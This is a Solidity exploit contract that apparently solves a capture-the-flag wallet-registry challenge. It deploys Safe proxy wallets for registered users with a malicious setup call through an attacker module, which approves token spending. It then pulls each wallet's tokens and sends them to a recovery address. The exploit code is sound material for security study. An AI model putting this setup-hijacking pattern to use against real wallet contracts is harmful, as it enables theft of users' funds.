pragma solidity =0.8.25;
import {Safe} from "safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {AttackerModule} from "./AttackerModule.sol";

interface IERC20{
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract WalletAttacker{
    address[] users;
    address singleton;
    IProxyCreationCallback callback;
    address walletFactory;
    address token;
    address recovery;

    constructor(address _singleton, address _callback, address[] memory _users, address _walletFactory,address _token,address _recovery){
        //callback = walletregistry
        singleton = _singleton;
        callback = IProxyCreationCallback(_callback);
        users = _users;
        walletFactory = _walletFactory;
        token = _token;
        recovery = _recovery;
    }

    function attack() public{
        AttackerModule module = new AttackerModule();

        for(uint8 i=0; i<4;i++){
            address[] memory userarray = new address[](1);
            userarray[0] = users[i];
            
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                userarray,    // 소유자 배열
                1,          // 서명 임계값 (threshold)
                address(module), 
                abi.encodeWithSignature("tokenApprove(address,address)", token, address(this)),         // 초기 데이터 없음
                address(0), // Fallback handler 없음
                address(0), // Payment receiver 없음
                0,          // Payment amount 없음
                address(0)  // Payment token 없음
            );

            SafeProxy wallet = SafeProxyFactory(walletFactory).createProxyWithCallback(singleton, initializer, 1234567, callback);
            IERC20(token).transferFrom(address(wallet), address(this),10e18);
        }

        IERC20(token).transfer(recovery, 40e18);


    }
}